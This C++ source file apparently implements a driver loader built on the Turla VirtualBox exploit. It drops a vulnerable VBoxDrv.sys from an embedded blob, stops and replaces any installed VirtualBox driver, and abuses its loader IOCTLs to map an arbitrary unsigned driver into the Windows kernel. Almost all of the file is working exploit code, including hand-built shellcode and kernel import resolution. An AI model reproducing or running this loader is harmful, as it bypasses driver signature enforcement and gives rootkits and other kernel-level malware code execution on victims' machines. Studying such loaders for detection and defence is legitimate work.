#include "TDL.h"
#include <Headers.hpp>
#include <process.h>
#include "vbox.h"

#include <Misc/NtHelpers.hpp>
#include <System/Driver/Shellcode.hpp>

HINSTANCE  g_hInstance;
HANDLE     g_ConOut = NULL;
BOOL       g_ConsoleOutput = FALSE;
WCHAR      BE = 0xFEFF;

WCHAR szVBoxDriver[MAX_PATH];
WCHAR szVBoxBackup[MAX_PATH];

#define VBoxDrvSvc      TEXT("VBoxDrv")
#define supImageName    "furutaka"
#define supImageHandle  0x1a000
#define scDataOffset    0x214 //shellcode data offset

using namespace Resurgence;

BOOL IsVBoxInstalled()
{
    BOOL found = FALSE;
    return NT_SUCCESS(Misc::NtHelpers::SystemObjectExists(L"\\Device", L"VBoxDrv", &found)) && found == TRUE;
}
BOOL StopVBoxServices(SC_HANDLE hSCManager)
{
    using namespace Misc;

    if(!NT_SUCCESS(NtHelpers::StopDriver(hSCManager, L"VBoxNetAdp")))
        return FALSE;
    LOG(DEBUG) << "Stopped VBoxNetAdp";
    if(!NT_SUCCESS(NtHelpers::StopDriver(hSCManager, L"VBoxNetLwf")))
        return FALSE;
    LOG(DEBUG) << "Stopped VBoxNetLwf";
    if(!NT_SUCCESS(NtHelpers::StopDriver(hSCManager, L"VBoxUSBMon")))
        return FALSE;
    LOG(DEBUG) << "Stopped VBoxUSBMon";
    if(!NT_SUCCESS(NtHelpers::StopDriver(hSCManager, L"VBoxDrv")))
        return FALSE;
    LOG(DEBUG) << "Stopped VBoxDrv";
    return TRUE;
}
BOOL BackupVBoxDriver()
{
    LOG(DEBUG) << "Backing up VBox driver to " << szVBoxBackup;
    return NT_SUCCESS(Misc::NtHelpers::CopyFile(szVBoxDriver, szVBoxBackup));
}
BOOL RestoreVBoxDriver()
{
    LOG(DEBUG) << "Restoring VBox driver to " << szVBoxDriver;
    return NT_SUCCESS(Misc::NtHelpers::CopyFile(szVBoxBackup, szVBoxDriver));
}
HANDLE StartVulnerableDriver(SC_HANDLE hSCManager)
{
    using namespace Misc;

    LOG(DEBUG) << "Starting Vulnerable Driver";

    HANDLE hVulnerableDriver = INVALID_HANDLE_VALUE;
    BOOL vbox_installed = IsVBoxInstalled();
    if(vbox_installed) {
        LOG(DEBUG) << "VirtualBox is installed.";
        if(!StopVBoxServices(hSCManager) || !BackupVBoxDriver())
            return INVALID_HANDLE_VALUE;
    }

    NtHelpers::WriteBufferToFile(szVBoxDriver, (LPVOID)SHELLCODE_VULNERABLE_DRIVER, SHELLCODE_VULNERABLE_DRIVER_SIZE);

    if(!vbox_installed) {
        LOG(DEBUG) << "VirtualBox is NOT installed.";
        LOG(DEBUG) << "Adding VBoxDrv to the database";
        NtHelpers::CreateDriverService(hSCManager, L"VBoxDrv", szVBoxDriver);
    }

    if(NT_SUCCESS(NtHelpers::StartDriver(hSCManager, L"VBoxDrv"))) {
        if(NT_SUCCESS(NtHelpers::GetDeviceHandle(L"VBoxDrv", &hVulnerableDriver)))
            LOG(DEBUG) << "Vulnerable driver loaded and opened";
        else
            LOG(DEBUG) << "Driver device open failure";
    }

    return hVulnerableDriver;
}
BOOL StopVulnerableDriver(SC_HANDLE hSCManager, HANDLE hVulnerableDriver)
{
    using namespace Misc;

    UNICODE_STRING     uStr;
    OBJECT_ATTRIBUTES  ObjectAttributes;

    LOG(DEBUG) << "Stopping Vulnerable Driver";

    if(hVulnerableDriver != INVALID_HANDLE_VALUE)
        CloseHandle(hVulnerableDriver);

    if(NT_SUCCESS(NtHelpers::StopDriver(hSCManager, L"VBoxDrv")))
        LOG(DEBUG) << "Vulnerable driver successfully unloaded";
    else {
        LOG(DEBUG) << "Unexpected error while unloading driver";
    }

    if(!IsVBoxInstalled()) {
        if(NT_SUCCESS(NtHelpers::DeleteDriverService(hSCManager, L"VBoxDrv")))
            LOG(DEBUG) << "Driver entry removed from registry";
        else
            LOG(DEBUG) << "Error removing driver entry from registry";

        RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
        InitializeObjectAttributes(&ObjectAttributes, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if(NT_SUCCESS(NtDeleteFile(&ObjectAttributes)))
            LOG(DEBUG) << "Driver file removed";
        else
            LOG(DEBUG) << "Error removing driver file";
    } else {
        if(RestoreVBoxDriver())
            LOG(DEBUG) << "Original driver restored";
        else
            LOG(DEBUG) << "Unexpected error while restoring original driver";

    }
    return TRUE;
}

/*
* TDLRelocImage
*
* Purpose:
*
* Process image relocs.
*
*/
void TDLRelocImage(
    ULONG_PTR Image,
    ULONG_PTR NewImageBase
) {
    PIMAGE_OPTIONAL_HEADER   popth;
    PIMAGE_BASE_RELOCATION   rel;
    DWORD_PTR                delta;
    LPWORD                   chains;
    DWORD                    c, p, rsz;

    popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

    if(popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
        if(popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0) {
            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
                popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

            rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            delta = (DWORD_PTR)NewImageBase - popth->ImageBase;
            c = 0;

            while(c < rsz) {
                p = sizeof(IMAGE_BASE_RELOCATION);
                chains = (LPWORD)((PBYTE)rel + p);

                while(p < rel->SizeOfBlock) {

                    switch(*chains >> 12) {
                        case IMAGE_REL_BASED_HIGHLOW:
                            *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
                            break;
                        case IMAGE_REL_BASED_DIR64:
                            *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
                            break;
                    }

                    chains++;
                    p += sizeof(WORD);
                }

                c += rel->SizeOfBlock;
                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
            }
        }
}

/*
* TDLGetProcAddress
*
* Purpose:
*
* Get NtOskrnl procedure address.
*
*/
ULONG_PTR TDLGetProcAddress(
    ULONG_PTR KernelBase,
    ULONG_PTR KernelImage,
    LPCSTR FunctionName
) {
    ANSI_STRING    cStr;
    ULONG_PTR      pfn = 0;

    RtlInitString(&cStr, FunctionName);
    if(!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))
        return 0;

    return KernelBase + (pfn - KernelImage);
}

/*
* TDLResolveKernelImport
*
* Purpose:
*
* Resolve import (ntoskrnl only).
*
*/
void TDLResolveKernelImport(
    ULONG_PTR Image,
    ULONG_PTR KernelImage,
    ULONG_PTR KernelBase
) {
    PIMAGE_OPTIONAL_HEADER      popth;
    ULONG_PTR                   ITableVA, *nextthunk;
    PIMAGE_IMPORT_DESCRIPTOR    ITable;
    PIMAGE_THUNK_DATA           pthunk;
    PIMAGE_IMPORT_BY_NAME       pname;
    ULONG                       i;

    popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

    if(popth->NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_IMPORT)
        return;

    ITableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if(ITableVA == 0)
        return;

    ITable = (PIMAGE_IMPORT_DESCRIPTOR)(Image + ITableVA);

    if(ITable->OriginalFirstThunk == 0)
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->FirstThunk);
    else
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->OriginalFirstThunk);

    for(i = 0; pthunk->u1.Function != 0; i++, pthunk++) {
        nextthunk = (PULONG_PTR)(Image + ITable->FirstThunk);
        if((pthunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0) {
            pname = (PIMAGE_IMPORT_BY_NAME)((PCHAR)Image + pthunk->u1.AddressOfData);
            nextthunk[i] = TDLGetProcAddress(KernelBase, KernelImage, pname->Name);
        } else
            nextthunk[i] = TDLGetProcAddress(KernelBase, KernelImage, (LPCSTR)(pthunk->u1.Ordinal & 0xffff));
    }
}

/*
* TDLExploit
*
* Purpose:
*
* VirtualBox exploit used by WinNT/Turla.
*
*/
void TDLExploit(
    HANDLE hVBox,
    LPVOID Shellcode,
    ULONG CodeSize
) {
    SUPCOOKIE       Cookie;
    SUPLDROPEN      OpenLdr;
    DWORD           bytesIO = 0;
    RTR0PTR         ImageBase = NULL;
    ULONG_PTR       paramOut;
    PSUPLDRLOAD     pLoadTask = NULL;
    SUPSETVMFORFAST vmFast;
    SUPLDRFREE      ldrFree;
    SIZE_T          memIO;

    while(hVBox != INVALID_HANDLE_VALUE) {
        RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));
        Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
        Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
        Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
        Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        Cookie.Hdr.rc = 0;
        Cookie.u.In.u32ReqVersion = 0;
        Cookie.u.In.u32MinVersion = 0x00070002;
        RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

        LOG(DEBUG) << "TDL: Acquiring session cookie";

        if(!DeviceIoControl(hVBox, SUP_IOCTL_COOKIE,
            &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
            SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL)) {
            LOG(ERROR) << "TDL: SUP_IOCTL_COOKIE call failed";
            break;
        }

        LOG(DEBUG) << "TDL: Success. Cookie: " << Cookie.u.Out.u32Cookie;

        RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
        OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
        OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
        OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        OpenLdr.Hdr.rc = 0;
        OpenLdr.u.In.cbImage = CodeSize;
        RtlCopyMemory(OpenLdr.u.In.szName, supImageName, sizeof(supImageName));

        if(!DeviceIoControl(hVBox, SUP_IOCTL_LDR_OPEN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL)) {
            LOG(ERROR) << "TDL: SUP_IOCTL_LDR_OPEN call failed";
            break;
        } else {
            LOG(DEBUG) << "TDL: OpenLdr.u.Out.pvImageBase = 0x" << OpenLdr.u.Out.pvImageBase;
        }

        ImageBase = OpenLdr.u.Out.pvImageBase;

        memIO = PAGE_SIZE + CodeSize;
        NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, 0, &memIO,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if(pLoadTask == NULL)
            break;

        pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        pLoadTask->Hdr.cbIn =
            (ULONG_PTR)(&((PSUPLDRLOAD)0)->u.In.achImage) + CodeSize;
        pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
        pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
        pLoadTask->Hdr.rc = 0;
        pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
        pLoadTask->u.In.pvImageBase = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)supImageHandle;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImageBase;
        RtlCopyMemory(pLoadTask->u.In.achImage, Shellcode, CodeSize);
        pLoadTask->u.In.cbImage = CodeSize;

        if(!DeviceIoControl(hVBox, SUP_IOCTL_LDR_LOAD,
            pLoadTask, pLoadTask->Hdr.cbIn,
            pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL)) {
            LOG(ERROR) << "TDL: SUP_IOCTL_LDR_LOAD call failed";
            break;
        } else {
            LOG(DEBUG) << "TDL: SUP_IOCTL_LDR_LOAD success. Shellcode mapped to ntoskrnl";
        }

        RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
        vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        vmFast.Hdr.rc = 0;
        vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
        vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
        vmFast.u.In.pVMR0 = (LPVOID)supImageHandle;

        if(!DeviceIoControl(hVBox, SUP_IOCTL_SET_VM_FOR_FAST,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL)) {
            LOG(DEBUG) << "TDL: SUP_IOCTL_SET_VM_FOR_FAST call failed";
            break;
        } else {
            LOG(DEBUG) << "TDL: SUP_IOCTL_SET_VM_FOR_FAST call complete";
        }

        LOG(DEBUG) << "TDL: SUP_IOCTL_FAST_DO_NOP";

        paramOut = 0;
        DeviceIoControl(hVBox, SUP_IOCTL_FAST_DO_NOP,
            NULL, 0,
            &paramOut, sizeof(paramOut), &bytesIO, NULL);

        LOG(DEBUG) << "TDL: SUP_IOCTL_LDR_FREE";

        RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
        ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        ldrFree.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
        ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
        ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        ldrFree.Hdr.rc = 0;
        ldrFree.u.In.pvImageBase = ImageBase;

        DeviceIoControl(hVBox, SUP_IOCTL_LDR_FREE,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIO, NULL);

        break;
    }

    if(pLoadTask != NULL) {
        memIO = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, &memIO, MEM_RELEASE);
    }
}

/*
* TDLMapDriver
*
* Purpose:
*
* Build shellcode and execute exploit.
*
*/
long __stdcall TDLMapDriver(
    HANDLE hVBox,
    LPCWSTR lpDriverFullName
) {
    ULONG              isz;
    SIZE_T             memIO;
    ULONG_PTR          KernelImage = 0, xExAllocatePoolWithTag = 0, xPsCreateSystemThread = 0;
    HMODULE            Image = NULL;
    PIMAGE_NT_HEADERS  FileHeader;
    PBYTE              Buffer = NULL;
    UNICODE_STRING     uStr;
    ANSI_STRING        routineName;
    NTSTATUS           status;
    RTL_PROCESS_MODULE_INFORMATION ntos;
    RtlZeroMemory(&ntos, sizeof(ntos));
    Resurgence::Misc::NtHelpers::GetSystemModuleInfo("ntoskrnl.exe", &ntos);
    while(ntos.ImageBase) {

        LOG(DEBUG) << "TDL: System base: " << ntos.ImageBase;
        
        RtlSecureZeroMemory(&uStr, sizeof(uStr));
        RtlInitUnicodeString(&uStr, lpDriverFullName);
        status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&Image);
        if((!NT_SUCCESS(status)) || (Image == NULL)) {
            LOG(ERROR) << "TDL: Error. Input driver not loaded";
            break;
        } else {
            LOG(DEBUG) << "TDL: Input driver file loaded at 0x" << (PVOID)Image;
        }

        FileHeader = RtlImageNtHeader(Image);
        if(FileHeader == NULL)
            break;

        isz = FileHeader->OptionalHeader.SizeOfImage;

        LOG(DEBUG) << "TDL: Loading ntoskrnl.exe";

        RtlInitUnicodeString(&uStr, L"ntoskrnl.exe");
        status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&KernelImage);
        if((!NT_SUCCESS(status)) || (KernelImage == 0)) {
            LOG(ERROR) << "TDL: Error. ntoskrnl.exe not loaded";
            break;
        } else {
            LOG(DEBUG) << "TDL: ntoskrnl.exe loaded at 0x" << (PVOID)KernelImage;
        }

        RtlInitString(&routineName, "ExAllocatePoolWithTag");
        status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xExAllocatePoolWithTag);
        if((!NT_SUCCESS(status)) || (xExAllocatePoolWithTag == 0)) {
            LOG(ERROR) << "TDL: Error. ExAllocatePoolWithTag not found";
            break;
        } else {
            LOG(DEBUG) << "TDL: ExAllocatePoolWithTag 0x" << (PVOID)((ULONG_PTR)ntos.ImageBase + (xExAllocatePoolWithTag - KernelImage));
        }

        RtlInitString(&routineName, "PsCreateSystemThread");
        status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xPsCreateSystemThread);
        if((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
            LOG(ERROR) << "TDL: Error. PsCreateSystemThread not found";
            break;
        } else {
            LOG(DEBUG) << "TDL: PsCreateSystemThread 0x" << (PVOID)((ULONG_PTR)ntos.ImageBase + (xPsCreateSystemThread - KernelImage));
        }

        memIO = isz + PAGE_SIZE;
        NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&Buffer, 0, &memIO,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if(Buffer == NULL) {
            LOG(ERROR) << "TDL: Error, unable to allocate shellcode";
            break;
        } else {
            LOG(DEBUG) << "TDL: Shellcode allocated at 0x" << (PVOID)Buffer;
        }

        // mov rcx, ExAllocatePoolWithTag
        // mov rdx, PsCreateSystemThread

        Buffer[0x00] = 0x48; // mov rcx, xxxxx
        Buffer[0x01] = 0xb9;
        *((PULONG_PTR)&Buffer[2]) =
            (ULONG_PTR)ntos.ImageBase + (xExAllocatePoolWithTag - KernelImage);
        Buffer[0x0a] = 0x48; // mov rdx, xxxxx
        Buffer[0x0b] = 0xba;
        *((PULONG_PTR)&Buffer[0x0c]) =
            (ULONG_PTR)ntos.ImageBase + (xPsCreateSystemThread - KernelImage);

        RtlCopyMemory(Buffer + 0x14, SHELLCODE_LOADER, SHELLCODE_LOADER_SIZE);
        RtlCopyMemory(Buffer + scDataOffset, Image, isz);

        LOG(DEBUG) << "TDL: Resolving kernel import";
        TDLResolveKernelImport((ULONG_PTR)Buffer + scDataOffset, KernelImage, (ULONG_PTR)ntos.ImageBase);

        LOG(DEBUG) << "TDL: Executing exploit";
        TDLExploit(hVBox, Buffer, isz + PAGE_SIZE);
        break;
    }

    if(Buffer != NULL) {
        memIO = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&Buffer, &memIO, MEM_RELEASE);
    }

    return status;
}

long __stdcall TDLLoadDriver(
    LPCWSTR lpDriverFullName)
{

    NTSTATUS status;
    SC_HANDLE hSCManager;

    LOG(DEBUG) << "Starting load";

    RtlZeroMemory(szVBoxDriver, sizeof(szVBoxDriver));
    if(!GetSystemDirectoryW(szVBoxDriver, MAX_PATH))
        return GetLastNtStatus();
    if(FAILED(StringCbCatW(szVBoxDriver, MAX_PATH, L"\\drivers\\VBoxDrv.sys")))
        return GetLastNtStatus();
    if(FAILED(StringCbCatW(szVBoxBackup, MAX_PATH, L"\\drivers\\VBoxDrv.sys.backup")))
        return GetLastNtStatus();

    hSCManager = OpenSCManager(NULL,
        NULL,
        SC_MANAGER_ALL_ACCESS
    );

    HANDLE hVulnerableDriver = StartVulnerableDriver(hSCManager);
    if(hVulnerableDriver != INVALID_HANDLE_VALUE) {
        if(!NT_SUCCESS(status = TDLMapDriver(hVulnerableDriver, lpDriverFullName))) {
            LOG(DEBUG) << "Failed to map driver.";
        } else {
            LOG(DEBUG) << "Driver mapped sucessfully";
            status = STATUS_SUCCESS;
        }
        StopVulnerableDriver(hSCManager, hVulnerableDriver);
    } else {
        status = STATUS_UNSUCCESSFUL;
    }
    CloseServiceHandle(hSCManager);
    return status;
}